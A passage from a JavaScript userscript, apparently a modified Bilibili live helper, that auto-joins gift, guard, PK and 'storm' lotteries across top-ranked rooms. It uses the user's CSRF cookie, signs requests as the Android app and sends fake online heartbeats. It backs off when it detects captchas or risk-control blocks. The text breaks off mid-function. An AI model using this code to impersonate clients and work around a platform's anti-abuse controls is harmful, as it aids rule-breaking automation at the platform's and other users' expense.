                    if (CONFIG.AUTO_LOTTERY_CONFIG.GUARD_AWARD_CONFIG.CHANGE_ROOM_INTERVAL > 0) {
                        setInterval(() => {
                            Lottery.listenAll();
                        }, CONFIG.AUTO_LOTTERY_CONFIG.GUARD_AWARD_CONFIG.CHANGE_ROOM_INTERVAL * 60e3);
                    }
                    setInterval(() => {
                        if (Lottery.createCount > 0) --Lottery.createCount;
                    }, 10e3);
                    if (CONFIG.AUTO_LOTTERY_CONFIG.GIFT_LOTTERY_CONFIG.REFRESH_INTERVAL > 0) {
                        setTimeout(() => {
                            // if(!BiliPush.connected){
                            //     location.reload();
                            // }
                        }, CONFIG.AUTO_LOTTERY_CONFIG.GIFT_LOTTERY_CONFIG.REFRESH_INTERVAL * 60e3);
                    }
                } catch (err) {
                    window.toast('[自动抽奖]运行时出现异常，已停止', 'error');
                    console.error(`[${NAME}]`, err);
                }
            }
        }; // Constantly Run

        const createIframe = (url, type, name) => {
            const iframe = $(`<iframe style="display: none;"></iframe>`)[0];
            if (!name) name = `_${Math.floor(Math.random() * 10000 + Math.random() * 1000 + Math.random() * 100 + Math.random() * 10).toString(16)}`;
            iframe.name = name;
            iframe.src = `${url}/${iframe.name}`;
            document.body.appendChild(iframe);
            const pFinish = $.Deferred();
            pFinish.then(() => {
                window[NAME].iframeSet.delete(iframe);
                $(iframe).remove();
            });
            const autoDel = setTimeout(() => pFinish.resolve(), 60e3); // iframe默认在60s后自动删除
            const pInit = $.Deferred();
            pInit.then(() => clearTimeout(autoDel)); // 如果初始化成功，父脚本不自动删除，由子脚本决定何时删除，否则说明子脚本加载失败，这个iframe没有意义
            const up = () => {
                CACHE = window[NAME].CACHE;
                Info = window[NAME].Info;
                Essential.Cache.save();
                const pUp = $.Deferred();
                pUp.then(up);
                iframe[NAME].promise.up = pUp;
            };
            const pUp = $.Deferred();
            pUp.then(up);
            iframe[NAME] = {
                type: type,
                promise: {
                    init: pInit, // 这个Promise在子脚本加载完成时resolve
                    finish: pFinish, // 这个Promise在iframe需要删除时resolve
                    down: $.Deferred(), // 这个Promise在子脚本的CONIG、CACHE、Info等需要重新读取时resolve
                    up: pUp
                }
            };
            window[NAME].iframeSet.add(iframe);
            DEBUG('createIframe', iframe);
        };

        const Init = () => {
            try {
                const promiseInit = $.Deferred();
                scriptRuning = true;
                console.log("魔改脚本成功运行...")
                Essential.init().then(() => {
                    console.log("脚本配置加载完毕...")
                    try {
                        API = BilibiliAPI;
                    } catch (err) {
                        window.toast('BilibiliAPI初始化失败，脚本已停用！', 'error');
                        console.error(`[${NAME}]`, err);
                        return p1.reject();
                    }
                    try{
                        TokenUtil = BilibiliToken;
                        Token = new TokenUtil();
                    }catch (err) {
                        TokenUtil = null;
                        Token = null;
                        window.toast('BilibiliToken 初始化失败，移动端功能可能失效！', 'error');
                        console.error(`[${NAME}]`, err);
                    }
                    const uniqueCheck = () => {
                        const p1 = $.Deferred();
                        const t = Date.now() / 1000;
                        //console.log('CACHE.unique_check',CACHE.unique_check, Date.now() / 1000);
                        if (t - CACHE.unique_check >= 0 && t - CACHE.unique_check <= 60) {
                            // 其他脚本正在运行
                            return p1.reject();
                        }
                        // 没有其他脚本正在运行
                        return p1.resolve();
                    };
                    uniqueCheck().then(() => {
                        let timer_unique;
                        const uniqueMark = () => {
                            timer_unique = setTimeout(uniqueMark, 2e3);
                            //console.log('CACHE.uniqueMark',CACHE.unique_check, Date.now() / 1000);
                            CACHE.unique_check = Date.now() / 1000;
                            //console.log('CACHE.uniqueMark',CACHE.unique_check, Date.now() / 1000);
                            Essential.Cache.save();
                        };
                        window.addEventListener('unload', () => {
                            if (timer_unique) {
                                clearTimeout(timer_unique);
                                CACHE.unique_check = 0;
                                Essential.Cache.save();
                            }
                        });
                        uniqueMark();
                        window.toast('正在初始化脚本...', 'info');
                        const InitData = () => {
                            const p = $.Deferred();
                            let initFailed = false;
                            const p2 = $.Deferred();
                            p2.then(() => {
                                initFailed = true;
                            });
                            let timer_p2 = setTimeout(() => p2.resolve(), 30e3);
                            let tryCount = 0;
                            runUntilSucceed(() => {
                                try {
                                    if (initFailed) {
                                        timer_p2 = undefined;
                                        window.toast('初始化用户数据、直播间数据超时，请关闭广告拦截插件后重试', 'error');
                                        p.reject();
                                        return true;
                                    }
                                    if (!window.BilibiliLive || parseInt(window.BilibiliLive.ROOMID, 10) === 0 || !window.__statisObserver) return false;
                                    DEBUG('Init: InitData: BilibiliLive', window.BilibiliLive);
                                    DEBUG('Init: InitData: __statisObserver', window.__statisObserver);
                                    clearTimeout(timer_p2);
                                    timer_p2 = undefined;
                                    if (parseInt(window.BilibiliLive.UID, 10) === 0 || isNaN(parseInt(window.BilibiliLive.UID, 10))) {
                                        if(tryCount > 20){
                                            window.toast('你还没有登录，助手无法使用！', 'caution');
                                            p.reject();
                                            return true;
                                        }else{
                                            return false;
                                        }
                                    }
                                    Info.short_id = window.BilibiliLive.SHORT_ROOMID;
                                    Info.roomid = window.BilibiliLive.ROOMID;
                                    Info.uid = window.BilibiliLive.UID;
                                    Info.ruid = window.BilibiliLive.ANCHOR_UID;
                                    Info.rnd = window.BilibiliLive.RND;
                                    Info.csrf_token = getCookie('bili_jct');
                                    Info.visit_id = window.__statisObserver ? window.__statisObserver.__visitId : '';
                                    API.setCommonArgs(Info.csrf_token, '');
                                    const p1 = API.live_user.get_info_in_room(Info.roomid).then((response) => {
                                        DEBUG('InitData: API.live_user.get_info_in_room', response);
                                        Info.silver = response.data.wallet.silver;
                                        Info.gold = response.data.wallet.gold;
                                        Info.uid = response.data.info.uid;
                                        Info.mobile_verify = response.data.info.mobile_verify;
                                        Info.identification = response.data.info.identification;
                                    });
                                    const p2 = API.gift.gift_config().then((response) => {
                                        DEBUG('InitData: API.gift.gift_config', response);
                                        if($.type(response.data)=="array"){
                                            Info.gift_list = response.data;
                                        }else if($.type(response.data.list)=="array"){
                                            Info.gift_list = response.data.list;
                                        }else{
                                            Info.gift_list = [];
                                            window.toast('直播间礼物数据获取失败', 'error');
                                            return;
                                        }
                                        Info.gift_list.forEach((v, i) => {
                                            if (i % 3 === 0) Info.gift_list_str += '<br>';
                                            Info.gift_list_str += `${v.id}：${v.name}`;
                                            if (i < Info.gift_list.length - 1) Info.gift_list_str += '，';
                                        });
                                    });
                                    $.when(p1, p2).then(() => {
                                        if (parseInt(window.BilibiliLive.UID, 10) === 0 || isNaN(parseInt(window.BilibiliLive.UID, 10))) {
                                            window.toast('你还没有登录，助手无法使用！', 'caution');
                                            p.reject();
                                            return;
                                        }
                                        Essential.DataSync.down();
                                        p.resolve();
                                    }, () => {
                                        window.toast('初始化用户数据、直播间数据失败', 'error');
                                        p.reject();
                                    });
                                    return true;
                                } catch (err) {
                                    if (timer_p2) clearTimeout(timer_p2);
                                    window.toast('初始化用户数据、直播间数据时出现异常', 'error');
                                    console.error(`[${NAME}]`, err);
                                    p.reject();
                                    return true;
                                }
                            }, 1, 500);
                            return p;
                        };
                        const InitFunctions = () => {
                            const promiseInitFunctions = $.Deferred();
                            $.when(TreasureBox.init()).then(() => promiseInitFunctions.resolve(), () => promiseInitFunctions.reject());
                            return promiseInitFunctions;
                        };
                        InitData().then(() => {
                            InitFunctions().then(() => {
                                promiseInit.resolve();
                            }, () => promiseInit.reject());
                        }, () => promiseInit.reject());
                    }, () => {
                        window.toast('有其他直播间页面的脚本正在运行，本页面脚本停止运行', 'caution');
                        promiseInit.reject();
                    });
                });
                return promiseInit;
            } catch (err) {
                window.toast('初始化时出现异常', 'error');
                console.error(`[${NAME}]`, err);
                return $.Deferred().reject();
            }
        };

        const TopRankTask = {
            process:async()=>{
                try{
                    let roomSet = new Set();
                    let toprank = await delayCall(() => BiliPushUtils.API.LiveRank.topRank(),1000);
                    let areaRank = await delayCall(() => BiliPushUtils.API.LiveRank.areaRank(0),1000);
                    let rankList = [toprank,areaRank];
                    let getListRsp = await API.room.getList();
                    if(getListRsp.code==0 && getListRsp.data){
                        for(let areaInfo of getListRsp.data){
                            let areaRank = await delayCall(() => BiliPushUtils.API.LiveRank.areaRank(areaInfo.id),1000)
                            rankList.push(areaRank);
                        }
                    }
                    for(let rsp of rankList){
                        if(rsp.code==0 && rsp.data.list){
                            for(let room of rsp.data.list){
                                roomSet.add(room.roomid)
                            }
                        }
                    }
                    for(let roomid of roomSet){
                        await BiliPushUtils.Check.run(roomid);
                    }
                    await delayCall(() => TopRankTask.run(), 300e3);
                } catch (err) {
                    console.error(`[${NAME}]`, err);
                    return delayCall(() => TopRankTask.run());
                }

            },
            run: async() => {
                try {
                    let done = true;
                    if (!CONFIG.AUTO_LOTTERY) {
                        done = false;
                    }
                    //if (Info.blocked) return $.Deferred().resolve();
                    if (!CONFIG.AUTO_LOTTERY_CONFIG.GIFT_LOTTERY && !CONFIG.AUTO_LOTTERY_CONFIG.GUARD_AWARD){
                        done = false;
                    }
                    if(!BiliPush.connected){
                        done = false;
                    }
                    if(!done){
                        setTimeout(()=>TopRankTask.run(),5000);
                        return $.Deferred().resolve();
                    }else{
                        await TopRankTask.process();
                        return $.Deferred().resolve();
                    }
                } catch (err) {
                    window.toast('[直播小时榜]运行时出现异常，已停止', 'error');
                    console.error(`[${NAME}]`, err);
                    return $.Deferred().reject();
                }
            }
        }; // Once Run every 1 mins

        const BiliPushUtils={
            raffleIdSet: new Set(),
            guardIdSet: new Set(),
            pkIdSet:new Set(),
            stormBlack:false,
            stormQueue:[],
            sign:null,
            msgIgnore:(msg)=>{
                if(msg){
                    let ignoreList=['操作太快','稍后再试','请求太多','频繁','繁忙'];
                    for(let ignore of ignoreList){
                        if(msg.indexOf(ignore)>-1){
                            return true;
                        }
                    }
                }
                return false;
            },
            clearSet:()=>{
                BiliPushUtils.splitSet(BiliPushUtils.raffleIdSet,1500,2);
                BiliPushUtils.splitSet(BiliPushUtils.guardIdSet,200,2);
                BiliPushUtils.splitSet(BiliPushUtils.pkIdSet,200,2);
            },
            splitSet:(set,limit,rate=2)=>{
                if(set && set.size>limit){
                    let end = limit/rate;
                    for(let item of set.entries()){
                        if(item[0]<=end){
                            set.delete(item[1]);
                        }
                    }
                }
            },
            up:() => {
                window.parent[NAME].Info = Info;
                window.parent[NAME].CACHE = CACHE;
                if(window.frameElement && window.frameElement[NAME]){
                    window.frameElement[NAME].promise.up.resolve();
                }
            },
            processing:0,
            ajax: (setting,roomid) => {
                const p = jQuery.Deferred();
                runUntilSucceed(() => {
                    if (BiliPushUtils.processing > 5) return false;
                    ++BiliPushUtils.processing;
                    return BiliPushUtils._ajax(setting).then((arg1, arg2, arg3) => {
                        --BiliPushUtils.processing;
                        p.resolve(arg1, arg2, arg3);
                        return true;
                    }).catch((arg1, arg2, arg3) => {
                        --BiliPushUtils.processing;
                        p.reject(arg1, arg2, arg3);
                        return true;
                    });
                });
                return p;
            },
            _ajax:(setting)=>{
                let url = (setting.url.substr(0, 2) === '//' ? '' : '//api.live.bilibili.com/') + setting.url;
                let option = {
                    method:setting.method || "GET",
                    headers:setting.headers || {},
                    credentials: 'include',
                    mode: 'cors'
                };
                if(setting.roomid){
                    option.referrer=location.protocol+"//"+location.hostname+"/"+setting.roomid;
                }
                if(option.method=="GET"){
                    if(setting.data){
                        url=`${url}?${$.param(setting.data)}`;
                    }
                }else{
                    option.headers["content-type"]="application/x-www-form-urlencoded";
                    if(setting.data){
                        option.body=$.param(setting.data);
                    }
                }
                return fetch(url,option).then(r=>r.json());
            },
            ajaxWithCommonArgs:(setting)=>{
                if(setting.data){
                    setting.data.csrf=Info.csrf_token;
                    setting.data.csrf_token=Info.csrf_token;
                }
                return BiliPushUtils.ajax(setting);
            },
            corsAjax:(setting)=>{
                const p = jQuery.Deferred();
                runUntilSucceed(() => {
                    return new Promise(success=>{
                        let option = BiliPushUtils._corsAjaxSetting(setting);
                        option.onload=(rsp)=>{
                            if(rsp.status == 200){
                                p.resolve(rsp.response);
                            }else{
                                p.reject(rsp);
                            }
                            success();
                        };
                        option.onerror=(err)=>{
                            p.reject(err);
                            success();
                        }
                        GM_xmlhttpRequest(option);
                    });
                });
                return p;
            },
            _corsAjaxSetting:(setting)=>{
                let url = (setting.url.substr(0, 2) === '//' ? location.protocol+'//' : location.protocol + '//api.live.bilibili.com/') + setting.url;
                let option = {
                    url:url,
                    method:setting.method || "GET",
                    headers:setting.headers ||{},
                    responseType:'json',
                };
                if(option.method=="GET"){
                    if(setting.data){
                        url=`${url}?${$.param(setting.data)}`;
                    }
                }else{
                    option.headers["content-type"]="application/x-www-form-urlencoded";
                    if(setting.data){
                        option.data=$.param(setting.data);
                    }
                }
                return option;
            },
            corsAjaxWithCommonArgs:(setting)=>{
                if(setting.data){
                    setting.data.csrf=Info.csrf_token;
                    setting.data.csrf_token=Info.csrf_token;
                }
                return BiliPushUtils.corsAjax(setting);
            },
            BaseRoomAction:async (roomid) => {
                //推送开启的话 信任推送数据
                if(BiliPush.connected){
                    return false;
                }else{
                    const p = $.Deferred();
                    BiliPushUtils.API.room.room_init(roomid).then((response) => {
                        DEBUG('BiliPushUtils.BaseRoomAction: BiliPushUtils.API.room.room_init', response);
                        if (response.code === 0) {
                            if (response.data.is_hidden || response.data.is_locked || response.data.encrypted || response.data.pwd_verified) return p.resolve(true);
                            return p.resolve(false);
                        }
                        p.reject();
                    }, () => {
                        p.reject();
                    }).always(() => {
                        BiliPushUtils.API.room.room_entry_action(roomid);
                    });
                    return p;
                }
            },
            API:{
                HeartGift:{
                    enter:(data)=>{
                        return BiliPushUtils.ajaxWithCommonArgs({
                            method: 'POST',
                            url: '//live-trace.bilibili.com/xlive/data-interface/v1/x25Kn/E',
                            data: data
                            ,roomid:data.room_id
                        });
                    },
                    heart:(data)=>{
                        return BiliPushUtils.ajaxWithCommonArgs({
                            method: 'POST',
                            url: '//live-trace.bilibili.com/xlive/data-interface/v1/x25Kn/X',
                            data: data
                            ,roomid:data.room_id
                        });
                    }
                },
                LiveRank:{
                    topRank:()=>{
                        return BiliPushUtils.ajax({
                            url: 'rankdb/v1/Rank2018/getTop?type=master_realtime_hour&type_id=areaid_realtime_hour'
                        });
                    },
                    areaRank:(areaid)=>{
                        return BiliPushUtils.ajax({
                            url: 'rankdb/v1/Rank2018/getTop?&type=master_last_hour&type_id=areaid_hour&page_size=10&area_id='+areaid
                        });
                    }
                },
                Heart:{
                    mobile:()=>{
                        let appheaders = {};
                        let param = "";
                        if(Token && TokenUtil){
                            appheaders = Token.headers
                            if(Info.appToken){
                                param = TokenUtil.signQuery(KeySign.sort({
                                    access_key:Info.appToken.access_token,
                                    appkey:TokenUtil.appKey,
                                    actionKey:'appkey',
                                    build:5561000,
                                    channel:'bili',
                                    device:'android',
                                    mobi_app:'android',
                                    platform:'android',
                                }));
                            }
                        }
                        return BiliPushUtils.corsAjax({
                            method: 'POST',
                            url: `heartbeat/v1/OnLine/mobileOnline?${param}`,
                            data: {'roomid': 21438956, 'scale': 'xxhdpi'},
                            headers:appheaders
                        });
                    },
                    mobile_login:()=>{
                        let param =TokenUtil.signLoginQuery(KeySign.sort({
                            access_key:Info.appToken.access_token
                        }));
                        return BiliPushUtils.corsAjax({
                            method: 'GET',
                            url: `//passport.bilibili.com/x/passport-login/oauth2/info?${param}`,
                            headers:Token.headers
                        });
                    },
                    mobile_info:()=>{
                        let param =TokenUtil.signQuery(KeySign.sort({
                            access_key:Info.appToken.access_token,
                            room_id:21438956,
                            appkey:TokenUtil.appKey,
                            actionKey:'appkey',
                            build:5561000,
                            channel:'bili',
                            device:'android',
                            mobi_app:'android',
                            platform:'android',
                        }));
                        return BiliPushUtils.corsAjax({
                            method: 'GET',
                            url: `xlive/app-room/v1/index/getInfoByUser?${param}`,
                            headers:Token.headers
                        });
                    },
                    pc:(success)=>{
                        return BiliPushUtils.corsAjaxWithCommonArgs({
                            method: 'POST',
                            url: 'User/userOnlineHeart',
                            data: {}
                        });
                    }
                },
                Check:{
                    check: (roomid) => {
                        return BiliPushUtils.ajax({
                            url: 'xlive/lottery-interface/v1/lottery/Check?roomid='+ roomid
                            ,roomid:roomid
                        });
                    },
                },
                Storm:{
                    check: (roomid) => {
                        // 检查是否有节奏风暴
                        return BiliPushUtils.ajax({
                            url: 'xlive/lottery-interface/v1/storm/Check?roomid=' + roomid
                            ,roomid:roomid
                        });
                    },
                    join: (id, roomid ,captcha_token="", captcha_phrase="", color = 15937617) => {
                        // 参加节奏风暴
                        return BiliPushUtils.ajaxWithCommonArgs({
                            method: 'POST',
                            url: 'xlive/lottery-interface/v1/storm/Join',
                            data: {
                                id: id,
                                color: color,
                                captcha_token: captcha_token,
                                captcha_phrase: captcha_phrase,
                                roomid: roomid
                            }
                            ,roomid:roomid
                        });
                    },
                    join_ex: (id, roomid ,captcha_token="", captcha_phrase="", color = 15937617) => {
                        // 参加节奏风暴
                        let param = TokenUtil.signQuery(KeySign.sort({
                            id:id,
                            access_key:Info.appToken.access_token,
                            appkey:TokenUtil.appKey,
                            actionKey:'appkey',
                            build:5561000,
                            channel:'bili',
                            device:'android',
                            mobi_app:'android',
                            platform:'android',
                        }));
                        return BiliPushUtils.corsAjaxWithCommonArgs({
                            method: 'POST',
                            url: `xlive/lottery-interface/v1/storm/Join?${param}`,
                            headers:Token.headers,
                            roomid:roomid
                        });
                    }
                },
                Guard: {
                    join: (roomid, id, type = 'guard') => {
                        return BiliPushUtils.ajaxWithCommonArgs({
                            method: 'POST',
                            url: 'xlive/lottery-interface/v3/guard/join',
                            data: {
                                roomid: roomid,
                                id: id,
                                type: type
                            }
                            ,roomid:roomid
                        });
                    },
                },
                Gift: {
                    join: (roomid, id, type = 'small_tv') => {
                        return BiliPushUtils.ajaxWithCommonArgs({
                            method: 'POST',
                            url: 'xlive/lottery-interface/v5/smalltv/join',
                            data: {
                                roomid: roomid,
                                id: id,
                                type: type
                            }
                            ,roomid:roomid
                        });
                    }
                },
                room:{
                    room_entry_action: (room_id, platform = 'pc') => {
                        return BiliPushUtils.ajaxWithCommonArgs({
                            method: 'POST',
                            url: 'room/v1/Room/room_entry_action',
                            data: {
                                room_id: room_id,
                                platform: platform
                            }
                            ,roomid:room_id
                        });
                    },
                    room_init: (id) => {
                        return BiliPushUtils.ajax({
                            url: 'room/v1/Room/room_init?id=' + id
                            ,roomid:id
                        });
                    },
                },
                Pk:{
                    join: (roomid, id) => {
                        return BiliPushUtils.ajaxWithCommonArgs({
                            method: 'POST',
                            url: 'xlive/lottery-interface/v1/pk/join',
                            data: {
                                roomid: roomid,
                                id: id
                            }
                            ,roomid:roomid
                        });
                    }
                }
            },
            Check:{
                roomSet:new Set(),
                roomCacheSet:new Set(),
                sleepTimeRange:[],
                sleepTimeRangeBuild:()=>{
                    const value = CONFIG.AUTO_LOTTERY_CONFIG.SLEEP_RANGE;
                    let time_range = [];
                    let options=value.split(',');
                    for(let timerangstr of options){
                        let time_tmp = [];
                        let baseTimes = timerangstr.split('-');
                        if(baseTimes && baseTimes.length==2){
                            let timeArray1 = baseTimes[0].split(':');
                            let timeArray2 = baseTimes[1].split(':');
                            time_range.push({
                                bh:parseInt(timeArray1[0]),
                                bm:parseInt(timeArray1[1]),
                                eh:parseInt(timeArray2[0]),
                                em:parseInt(timeArray2[1]),
                                str:timerangstr
                            });
                        }
                    }
                    BiliPushUtils.Check.sleepTimeRange = time_range;
                    return time_range;
                },
                checkSleep:()=>{
                    let srange = BiliPushUtils.Check.sleepTimeRange;
                    const now = new Date();
                    function dayTime(hours,mins){
                        return new Date().setHours(hours,mins,0,0)
                    }
                    let f = srange.find(it=>dayTime(it.bh,it.bm)<= now && now<=dayTime(it.eh,it.em));
                    return f;
                },
                start:async ()=>{
                    try{
                        //var tmp = Array.from(BiliPushUtils.Check.roomSet);
                        //检查是否休眠
                        if(!BiliPushUtils.Check.checkSleep()){
                            BiliPushUtils.Check.roomCacheSet.clear();
                            for(let room_id of BiliPushUtils.Check.roomSet){
                                if(BiliPushUtils.Check.checkSleep()){
                                    break;
                                }
                                if(BiliPushUtils.Check.roomSet.has(room_id)){
                                    BiliPushUtils.Check.roomSet.delete(room_id);
                                    await BiliPushUtils.Check.process(room_id);
                                    await delayCall(() => {},300);
                                }
                            }
                        }
                        setTimeout(()=>BiliPushUtils.Check.start(),1000);
                        return $.Deferred().resolve();
                    }catch(e){
                        setTimeout(()=>BiliPushUtils.Check.start(),1000);
                        return $.Deferred().reject();
                    }
                },
                run:(roomid) => {
                    if (!CONFIG.AUTO_LOTTERY) return $.Deferred().resolve();
                    //if (Info.blocked) return $.Deferred().resolve();
                    if (!CONFIG.AUTO_LOTTERY_CONFIG.GIFT_LOTTERY && !CONFIG.AUTO_LOTTERY_CONFIG.GUARD_AWARD) return $.Deferred().resolve();
                    let sleep = BiliPushUtils.Check.checkSleep();
                    if(sleep){
                        console.log(`自动休眠 ${sleep.str} 跳过抽奖检测,roomid=${roomid}`);
                        return $.Deferred().resolve();
                    }
                    if(!BiliPushUtils.Check.roomCacheSet.has(roomid)){
                        BiliPushUtils.Check.roomCacheSet.add(roomid);
                        BiliPushUtils.Check.roomSet.add(roomid);
                    }
                    return $.Deferred().resolve();
                },
                process:(roomid) => {
                    try {
                        if (!CONFIG.AUTO_LOTTERY) return $.Deferred().resolve();
                        //if (Info.blocked) return $.Deferred().resolve();
                        if (!CONFIG.AUTO_LOTTERY_CONFIG.GIFT_LOTTERY && !CONFIG.AUTO_LOTTERY_CONFIG.GUARD_AWARD) return $.Deferred().resolve();
                        let sleep = BiliPushUtils.Check.checkSleep();
                        if(sleep){
                            console.log(`自动休眠 ${sleep.str} 跳过抽奖检测,roomid=${roomid}`);
                            return $.Deferred().resolve();
                        }
                        BiliPushUtils.Check.roomSet.delete(roomid);
                        return BiliPushUtils.BaseRoomAction(roomid).then((fishing) => {
                            if (!fishing) {
                                return BiliPushUtils.API.Check.check(roomid).then((response) => {
                                    DEBUG('BiliPushUtils.Check.run: BiliPushUtils.API.Check.check', response);
                                    if (response.code === 0) {
                                        var data = response.data;
                                        if(CONFIG.AUTO_LOTTERY_CONFIG.GIFT_LOTTERY){
                                            if(data.gift && data.gift.length > 0){
                                                BiliPushUtils.Gift.join(roomid, data.gift);
                                            }
                                        }
                                        if (CONFIG.AUTO_LOTTERY_CONFIG.GUARD_AWARD){
                                            if(data.guard && data.guard.length > 0){
                                                BiliPushUtils.Guard.join(roomid, data.guard);
                                            }
                                        }
                                        if (CONFIG.AUTO_LOTTERY_CONFIG.PK_AWARD){
                                            if(data.pk && data.pk.length > 0){
                                                BiliPushUtils.Pk.join(roomid, data.pk);
                                            }
                                        }
                                        return $.Deferred().resolve();
                                    } else {
                                        window.toast(`[自动抽奖][查询](roomid=${roomid})${response.msg}`, 'caution');
                                    }
                                }, () => {
                                    window.toast(`[自动抽奖][查询]检查礼物(${roomid})失败，请检查网络`, 'error');
                                    return delayCall(() => BiliPushUtils.Check.run(roomid));
                                });
                            }
                        },()=>{
                            window.toast(`[自动抽奖][查询]检查直播间(${roomid})失败，请检查网络`, 'error');
                            return delayCall(() => BiliPushUtils.Check.run(roomid),1e3);
                        });
                    } catch (err) {
                        window.toast('[自动抽奖][查询]运行时出现异常', 'error');
                        console.error(`[${NAME}]`, err);
                        return $.Deferred().reject();
                    }
                }
            },
            Storm:{
                check:(id)=>{
                    return BiliPushUtils.stormQueue.indexOf(id)>-1;
                },
                append:(id)=>{
                    BiliPushUtils.stormQueue.push(id);
                    if(BiliPushUtils.stormQueue.length > CONFIG.AUTO_LOTTERY_CONFIG.STORM_CONFIG.STORM_QUEUE_SIZE){
                        BiliPushUtils.stormQueue.shift();
                    }
                },
                over:(id)=>{
                    var index = BiliPushUtils.stormQueue.indexOf(id);
                    if(index>-1){
                        BiliPushUtils.stormQueue.splice(id,1);
                    }
                },
                run:(roomid)=>{
                    try {
                        if (!CONFIG.AUTO_LOTTERY) return $.Deferred().resolve();
                        //if (Info.blocked) return $.Deferred().resolve();
                        if(BiliPushUtils.stormBlack) return $.Deferred().resolve();
                        if(!CONFIG.AUTO_LOTTERY_CONFIG.STORM) return $.Deferred().resolve();
                        let sleep = BiliPushUtils.Check.checkSleep();
                        if(sleep){
                            console.log(`自动休眠 ${sleep.str} 跳过风暴检测,roomid=${roomid}`);
                            return $.Deferred().resolve();
                        }
                        return BiliPushUtils.API.Storm.check(roomid).then((response) => {
                            DEBUG('BiliPushUtils.Storm.run: BiliPushUtils.API.Storm.check', response);
                            if (response.code === 0) {
                                var data = response.data;
                                BiliPushUtils.Storm.join(data.id,data.roomid,Math.round(new Date().getTime()/1000)+data.time);
                                return $.Deferred().resolve();
                            } else {
                                window.toast(`[自动抽奖][节奏风暴](roomid=${roomid})${response.msg}`, 'caution');
                            }
                        }, () => {
                            window.toast(`[自动抽奖][节奏风暴]检查直播间(${roomid})失败，请检查网络`, 'error');
                            //return delayCall(() => BiliPushUtils.Storm.run(roomid));
                        });
                    } catch (err) {
                        window.toast('[自动抽奖][节奏风暴]运行时出现异常', 'error');
                        console.error(`[${NAME}]`, err);
                        return $.Deferred().reject();
                    }
                },
                join:(id,roomid,endtime)=>{
                    //if (Info.blocked) return $.Deferred().resolve();
                    roomid = parseInt(roomid, 10);
                    id = parseInt(id, 10);
                    if (isNaN(roomid) || isNaN(id)) return $.Deferred().reject();
                    var tid = Math.round(id/1000000);
                    if (BiliPushUtils.guardIdSet.has(tid)) return $.Deferred().resolve();
                    BiliPushUtils.guardIdSet.add(tid);
                    if(BiliPushUtils.Storm.check(id)){
                        return;
                    }
                    BiliPushUtils.Storm.append(id);
                    var stormInterval = 0;
                    if(endtime<=0){
                        endtime = Math.round(new Date().getTime()/1000) + 90;
                    }
                    var count = 0;
                    window.toast(`[自动抽奖][节奏风暴]尝试抽奖(roomid=${roomid},id=${id})`, 'success');
                    async function process(){
                        try{
                            if(!BiliPushUtils.Storm.check(id)){
                                clearInterval(stormInterval);
                                return;
                            }
                            var timenow = Math.round(new Date().getTime()/1000);
                            //console.log('stormdebug:',id,count,timenow,endtime);
                            if(timenow > endtime && endtime > 0){
                                BiliPushUtils.Storm.over(id);
                                clearInterval(stormInterval);
                                //window.toast(`[自动抽奖][节奏风暴]抽奖(roomid=${roomid},id=${id})过期。\r\n尝试次数:${count}`, 'caution');
                                return;
                            }
                            count++;
                            if(count > CONFIG.AUTO_LOTTERY_CONFIG.STORM_CONFIG.STORM_MAX_COUNT && CONFIG.AUTO_LOTTERY_CONFIG.STORM_CONFIG.STORM_MAX_COUNT > 0){
                                BiliPushUtils.Storm.over(id);
                                clearInterval(stormInterval);
                                window.toast(`[自动抽奖][节奏风暴]抽奖(roomid=${roomid},id=${id})到达尝试次数。\r\n尝试次数:${count},距离到期:${endtime-timenow}s`, 'caution');
                                return;
                            }
                            let response;
                            try{
                                if(Token && TokenUtil && Info.appToken){
                                    response = await BiliPushUtils.API.Storm.join_ex(id,roomid);
                                }else{
                                    response = await BiliPushUtils.API.Storm.join(id,roomid);
                                }
                                DEBUG('BiliPushUtils.Storm.join: BiliPushUtils.API.Storm.join', response);
                                if(response.code){
                                    if(response.msg.indexOf("领取")!=-1){
                                        BiliPushUtils.Storm.over(id);
                                        clearInterval(stormInterval);
                                        window.toast(`[自动抽奖][节奏风暴]领取(roomid=${roomid},id=${id})成功,${response.msg}\r\n尝试次数:${count}`, 'success');
                                        return;
                                    }
                                    if(response.msg.indexOf("验证码")!=-1){
                                        BiliPushUtils.Storm.over(id);
                                        clearInterval(stormInterval);
                                        BiliPushUtils.stormBlack = true;
                                        window.toast(`[自动抽奖][节奏风暴]抽奖(roomid=${roomid},id=${id})失败,疑似账号不支持,${response.msg}`, 'caution');
                                        return;
                                    }
                                    if(response.data && response.data.length==0 && response.msg.indexOf("下次要更快一点")!=-1){
                                        BiliPushUtils.Storm.over(id);
                                        window.toast(`[自动抽奖][节奏风暴]抽奖(roomid=${roomid},id=${id})疑似风暴黑屋,终止！`, 'error');
                                        clearInterval(stormInterval);
                                        BiliPushUtils.stormBlack = true;
                                        setTimeout(()=>{BiliPushUtils.stormBlack = false;},3600*1000);
                                        return;
                                    }
                                    if(response.msg.indexOf("下次要更快一点")==-1){
                                        clearInterval(stormInterval);
                                        return;
                                    }
                                    //setTimeout(()=>process(),CONFIG.AUTO_LOTTERY_CONFIG.STORM_CONFIG.STORM_ONE_LIMIT);
                                }else{
                                    BiliPushUtils.Storm.over(id);
                                    Statistics.appendGift(response.data.gift_name,response.data.gift_num);
                                    window.toast(`[自动抽奖][节奏风暴]领取(roomid=${roomid},id=${id})成功,${response.data.gift_name+"x"+response.data.gift_num}\r\n${response.data.mobile_content}\r\n尝试次数:${count}`, 'success');
                                    clearInterval(stormInterval);
                                    return;
                                }
                            }catch(e){
                                BiliPushUtils.Storm.over(id);
                                window.toast(`[自动抽奖][节奏风暴]抽奖(roomid=${roomid},id=${id})疑似触发风控,终止！\r\n尝试次数:${count}`, 'error');
                                console.error(e);
                                clearInterval(stormInterval);
                                return;
                            }
                        }
                        catch(e){
                            BiliPushUtils.Storm.over(id);
                            window.toast(`[自动抽奖][节奏风暴]抽奖(roomid=${roomid},id=${id})抽奖异常,终止！`, 'error');
                            console.error(e);
                            clearInterval(stormInterval);
                            return;
                        }
                    }
                    //setTimeout(()=>process(),1);
                    stormInterval = setInterval(()=>process(),CONFIG.AUTO_LOTTERY_CONFIG.STORM_CONFIG.STORM_ONE_LIMIT);
                    return $.Deferred().resolve();
                }
            },
            Pk:{
                run:(roomid)=>(BiliPushUtils.Check.run(roomid)),
                join:async (roomid, ids) => {
                    try{
                        //console.log(`Pk.join`,roomid,ids,i)
                        if (!ids) return $.Deferred().resolve();
                        //if (Info.blocked) return $.Deferred().resolve();
                        for(let obj of ids){
                            // id过滤，防止重复参加
                            var id = parseInt(obj.id, 10);
